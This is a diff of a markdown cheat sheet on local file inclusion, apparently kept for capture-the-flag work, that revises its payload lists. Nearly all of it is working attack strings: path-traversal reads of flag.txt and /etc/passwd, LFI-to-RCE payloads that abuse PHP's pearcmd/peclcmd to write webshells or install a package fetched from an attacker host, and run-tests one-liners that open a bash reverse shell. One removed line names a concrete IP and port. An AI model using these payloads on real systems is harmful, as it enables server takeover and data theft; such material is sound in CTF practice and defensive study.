@@ -1,6 +1,6 @@
 # LFI
 
-## Fast Probes
+## Try
 
 ```text
 ../../../../flag.txt
@@ -9,7 +9,7 @@
 %252e%252e%252f%252e%252e%252fflag.txt
 ```
 
-## Payload Bank
+## Traversal
 
 ```text
 /?file=/flag.txt
@@ -53,7 +53,7 @@ find -name "*.php"
 ../../../etc/passwd%00.png
 ```
 
-## Post-Read Priority
+## Read After LFI
 
 1. App source: routes, templates, middleware, validators.
 2. Config: `.env`, `config.py`, `settings.py`, `application.yml`, `composer.json`.
@@ -71,28 +71,36 @@ find -name "*.php"
 
 ## LFI2RCE via pearcmd / peclcmd
 
-Note:&#x20;
+Works when LFI can include PEAR/PECL helper PHP and query args are parsed as CLI argv.
 
-```url
-?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.ph&/<?=system(‘whoami’)?>+../../../../../tmp/sudo_von.ph
+### Find Utility
 
-?+config-create+/&page=../../../../../usr/local/lib/php/pearcmd.ph&/<?=system(‘curl WEBHOOK |’)?>+../../../../../tmp/sudo_von.php
-
-?+config-create+/&file=.././.././.././.././../usr/local/lib/./php/peclcmd.php&/<?=system(base64_decode('Y2F0IC9mbGFnX25lX2hpaGkudHh0'));?>+/tmp/hello.php
+```text
+/?file=/usr/local/lib/php/peclcmd.php
+/?file=/usr/local/lib/php/pearcmd.php
+/?file=../../../../usr/local/lib/php/peclcmd.php
+/?file=..././..././..././usr/local/lib/php/peclcmd.php
 ```
 
-With Base64
+### Install Package Webshell
 
+```text
+/?+install+--force+--installroot+/tmp/pwn+http://ATTACKER/shell.tgz+&file=../../../../usr/local/lib/php/peclcmd.php
+/?file=/tmp/pwn/usr/local/lib/php/PKG-1.0.0/PKG.php&cmd=id
 ```
-/?+config-create+/&eHh4eD4qKipQRDl3YUhBZ2MzbHpkR1Z0S0NSZlIwVlVXMk50WkYwcE96czdQejRn<&kaibro=/usr/local/lib/php/pearcmd&/<meow>+/tmp/meoww.php
 
-/?kaibro=php%3a//filter/read=string.strip_tags%7Cconvert.base64-decode%7Cstring.strip_tags%7Cconvert.base64-decode/resource=/tmp/meoww&cmd=/readflag
+### Write PHP With config-create
+
+```text
+/?+config-create+/<?=system($_GET[0]);?>+/tmp/s.php&file=../../../../usr/local/lib/php/pearcmd.php
+/?file=/tmp/s.php&0=id
 ```
 
-Revshell
+### run-tests One Shot
 
-```
-curl "http://localhost/usr/local/lib/php/peclcmd.php?+run-tests+-i+-r\"system(hex2bin('$(hex "bash -c 'sh -i >& /dev/tcp/108.137.37.157/4444 0>&1'")'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"
+```bash
+cmd="bash -c 'sh -i >& /dev/tcp/ATTACKER/4444 0>&1'"
+curl "http://TARGET/?+run-tests+-i+-r\"system(hex2bin('$(printf %s "$cmd" | xxd -p -c 256)'));\"+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt&file=../../../../usr/local/lib/php/peclcmd.php"
 
 ```
 
